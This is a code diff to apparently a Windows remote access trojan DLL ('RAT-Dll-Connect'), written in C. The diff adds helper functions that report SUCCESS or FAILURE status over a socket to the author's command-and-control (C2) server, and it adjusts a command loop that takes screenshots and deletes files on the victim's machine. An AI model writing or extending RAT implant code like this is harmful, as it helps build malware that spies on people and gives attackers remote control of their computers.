@@ -356,19 +356,29 @@ INT startListen()
                     goto cleanup;
                 }
 
-                // TODO: change this so we pass a file handle maybe? then do sendback here along with success code 
+                // Tell our C2 success again since we deleted the file as well...
+                status = sendSuccess(clientSock);
+                if (status != SUCCESS)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from sendSuccess %d\n", status);
+                    OutputDebugStringA(msgBuf);
+                    goto cleanup;
+                }
 
+                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed screenshot!\n");
             }
         }
 
+        // We didn't receive any bytes for some reason so try again...
         else if (status == 0)
         {
-            OutputDebugStringA("RAT-Dll::startListen - Failure received from recv (file path); attempting to recv again...\n");
+            OutputDebugStringA("RAT-Dll::startListen - Failure received from recv (command); attempting to recv again...\n");
         }
 
+        // Weird error code; time to bail (technically this is covered by what's below? should remove this probably...)
         else
         {
-            sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from recv (file path) %d\n", WSAGetLastError());
+            sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from recv %d\n", WSAGetLastError());
             OutputDebugStringA(msgBuf);
             closesocket(clientSock);
             WSACleanup();
@@ -399,3 +409,55 @@ cleanup:
 }
 
 
+/** Helper function to send a SUCCESS status code to our C2
+params:
+* clientSock - current socket connection with our C2
+return:
+* if successful we return SUCCESS; otherwise print error code and handle appropiately
+*/
+INT sendSuccess(SOCKET clientSock)
+{
+    INT status = SUCCESS;
+    CHAR msgBuf[DEFAULT_BUF_LEN];
+
+    status = send(clientSock, "SUCCESS", 7, 0);
+    if (status == SOCKET_ERROR)
+    {
+        sprintf_s(msgBuf, "RAT-Dll-Connect::sendSuccess - Failure recevied from send (status code) %d\n", WSAGetLastError());
+        OutputDebugStringA(msgBuf);
+        status = WSAGetLastError();
+        goto cleanup;
+    }
+
+    // Send returns number of bytes so make sure we return the actual success code
+    status = SUCCESS;
+
+cleanup:
+    return status;
+}
+
+
+/** Helper function to send a FAILURE status code to our C2
+params:
+* clientSock - current socket connection with our C2
+return:
+* if successful we return SUCCESS; otherwise print error code and handle appropiately
+*/
+INT sendFailure(SOCKET clientSock)
+{
+    INT status = SUCCESS;
+    CHAR msgBuf[DEFAULT_BUF_LEN];
+
+    status = send(clientSock, "FAILURE", 7, 0);
+    if (status == SOCKET_ERROR)
+    {
+        sprintf_s(msgBuf, "RAT-Dll-Connect::sendFailure - Failure recevied from send (status code) %d\n", WSAGetLastError());
+        OutputDebugStringA(msgBuf);
+        status = WSAGetLastError();
+        goto cleanup;
+    }
+
+cleanup:
+    return status;
+
+}
